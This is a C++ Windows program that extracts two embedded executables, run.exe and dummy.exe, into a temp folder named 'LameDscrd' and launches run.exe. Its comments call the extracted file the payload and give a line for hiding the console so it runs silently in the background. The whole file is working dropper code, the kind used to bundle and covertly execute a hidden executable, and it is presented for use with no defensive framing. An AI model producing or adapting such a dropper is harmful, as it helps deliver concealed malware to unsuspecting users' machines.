#include <windows.h>
#include <iostream>
#include <fstream>
#include <filesystem>

namespace fs = std::filesystem;

// Resource IDs defined in the .rc script
#define IDR_RUNEXE   101
#define IDR_DUMMYEXE 102

// Helper function to extract an embedded resource to disk
bool ExtractResource(int resourceId, const fs::path& outputPath) {
    HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(resourceId), RT_RCDATA);
    if (!hRes) return false;

    HGLOBAL hData = LoadResource(NULL, hRes);
    if (!hData) return false;

    DWORD dataSize = SizeofResource(NULL, hRes);
    LPVOID pData = LockResource(hData);
    if (!pData || dataSize == 0) return false;

    std::ofstream outFile(outputPath, std::ios::binary);
    if (!outFile) return false;

    outFile.write(static_cast<const char*>(pData), dataSize);
    return true;
}

int main() {
    // Hide the console window if you want it to run completely silently in the background:
    // ::ShowWindow(::GetConsoleWindow(), SW_HIDE);

    // Get a temporary working directory for the payload
    fs::path tempDir = fs::temp_directory_path() / "LameDscrd";
    std::error_code ec;
    fs::create_directories(tempDir, ec);

    fs::path runPath = tempDir / "run.exe";
    fs::path dummyPath = tempDir / "dummy.exe";

    // Extract bundled files
    if (!ExtractResource(IDR_RUNEXE, runPath)) {
        std::cerr << "Failed to extract run.exe\n";
        return 1;
    }
    
    if (!ExtractResource(IDR_DUMMYEXE, dummyPath)) {
        std::cerr << "Failed to extract dummy.exe\n";
        // non-fatal if dummy isn't strictly required to exist alongside, but good to have
    }

    // Launch run.exe automatically
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};

    std::wstring cmdLine = L"\"" + runPath.wstring() + L"\"";
    
    // Pass execution to run.exe (working directory set to tempDir so it can find dummy.exe if needed)
    if (CreateProcessW(
        NULL, 
        const_cast<wchar_t*>(cmdLine.c_str()), 
        NULL, NULL, FALSE, 0, NULL, 
        tempDir.wstring().c_str(), 
        &si, &pi
    )) {
        // Optional: Wait for run.exe to finish before wrapper exits
        // WaitForSingleObject(pi.hProcess, INFINITE);
        
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        std::cerr << "Failed to launch run.exe.\n";
        return 1;
    }

    return 0;
}